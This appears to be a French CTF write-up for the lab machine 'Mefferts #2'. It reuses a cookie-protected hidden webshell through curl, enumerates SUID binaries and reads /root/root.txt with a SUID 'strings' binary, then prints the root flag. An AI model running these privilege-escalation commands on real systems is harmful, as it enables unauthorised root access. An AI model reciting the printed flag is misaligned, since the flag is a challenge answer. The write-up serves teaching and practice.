# Write-up : "Mefferts #2"

**Cible :** 10.10.0.22 (même machine que "Mefferts", l'IP change à chaque redéploiement)

**Objectif :** Obtenir root.txt

**Difficulté :** Easy

**Date :** 15/09/2026

**Techniques utilisées :** Réutilisation de la RCE existante, abus de binaire SUID root pour lire un fichier appartenant à root

**Outils utilisés :** curl

**Prérequis :** RCE en `www-data` obtenue lors de "Mefferts" (webshell `/my_very_secret_dir/index.php?cmd=` + cookie `login=uwe:thisisnotevennecessary`).

---

## 1. Rappel du point d'appui

On dispose déjà d'une **RCE en `www-data`** via le webshell caché découvert dans le write-up "Mefferts" :

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=id" -b "login=uwe:thisisnotevennecessary"
# uid=33(www-data)
```

> Rappel : dans une URL, `%20` = espace ; l'option `-b` envoie le cookie (obligatoire pour accéder à la page).

---

## 2. L'escalade : le SUID `strings`

Lors de la recherche de binaires SUID, on avait trouvé un binaire anormal tournant en root :

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=find / -perm -4000 -type f 2>/dev/null" -b "login=uwe:thisisnotevennecessary"
# → /usr/bin/x86_64-linux-gnu-strings
```

**Faille exploitée :** Binaire SUID root permettant la lecture de fichiers arbitraires (CWE-732 : Incorrect Permission Assignment).

**Pourquoi ça marche :** comme `strings` s'exécute avec les privilèges de root (bit SUID), il peut lire des fichiers auxquels `www-data` n'a normalement pas accès — y compris `/root/root.txt`.

---

## 3. Lecture de root.txt

**Commande :**

```bash
curl -s "http://10.10.0.22/my_very_secret_dir/index.php?cmd=/usr/bin/x86_64-linux-gnu-strings /root/root.txt" -b "login=uwe:thisisnotevennecessary"
```

**Résultat / FLAG obtenu :**

```
EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}
```

---

## Résumé des failles exploitées

| #   | Faille                                        | Catégorie (CWE) |
| --- | --------------------------------------------- | --------------- |
| 1   | Webshell RCE réutilisé (www-data)             | CWE-78          |
| 2   | Binaire SUID root `strings`                   | CWE-732         |

---

## Chaîne d'exploitation (résumé visuel)

```
RCE www-data (webshell "Mefferts")
        │
        ▼
find / -perm -4000 → /usr/bin/x86_64-linux-gnu-strings (SUID root)
        │
        ▼
strings /root/root.txt  (lecture privilégiée)
        │
        ▼
FLAG root
```

---

## Conclusion

- **Même principe que le user.txt** : on réutilise la RCE `www-data` et le binaire SUID `strings`.
- Comme `strings` tourne en root, il lit `/root/root.txt` que `www-data` ne peut pas ouvrir.
- **Flag root :** `EPI{whA7_i5_7Hi5_5h3Ng5h0u_3Xaminx_i5_11x11_w7f}`
